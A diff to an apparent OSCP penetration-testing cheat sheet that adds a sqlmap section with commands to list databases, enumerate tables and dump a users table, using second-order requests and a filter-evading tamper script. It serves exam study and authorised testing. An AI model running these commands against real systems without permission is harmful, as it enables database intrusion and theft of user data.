@@ -61,6 +61,11 @@ This repository describes cheat sheet and knowledge for OSCP.
 - [SQL Injection](#sql-injection)
   - [PayloadsAllTheThings](#payloadsallthethings-1)
     - [Insert Statement injection using ON DUPLICATE KEY UPDATE](#insert-statement-injection-using-on-duplicate-key-update)
+  - [sqlmap](#sqlmap)
+    - [Basic Example](#basic-example)
+    - [second request](#second-request)
+    - [enumerate tables](#enumerate-tables)
+    - [extract data from table](#extract-data-from-table)
 - [XSS](#xss)
   - [Polyglot](#polyglot)
 - [Aggregating Sensitive Information](#aggregating-sensitive-information)
@@ -347,6 +352,33 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
 
 ### Insert Statement injection using ON DUPLICATE KEY UPDATE
 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#insert-statement---on-duplicate-key-update
+
+## sqlmap
+### Basic Example
+```shell
+sqlmap -r req.txt --dbs --batch --threads 5
+```
+`--dbs`: get database list.
+
+### second request
+After sending the tampered request, send the second request to check the response.
+```shell
+sqlmap -r req.txt --second-req=secreq.txt --dbs --threads 5 --tamper=space2comment --batch
+```
+'tamper' is explained below:
+[Tamper](https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap#tamper)
+
+### enumerate tables
+```shell
+sqlmap -r req.txt --second-req=secreq.txt --threads 5 --tamper=space2comment --tables --batch -D mysql
+```
+`-D`: specify DBS (e.g, mysql)
+
+### extract data from table
+```shell
+sqlmap -r req.txt --second-req=secreq.txt --threads 5 --tamper=space2comment -T users --dump
+```
+`-T`: table name
 
 # XSS
 ## Polyglot
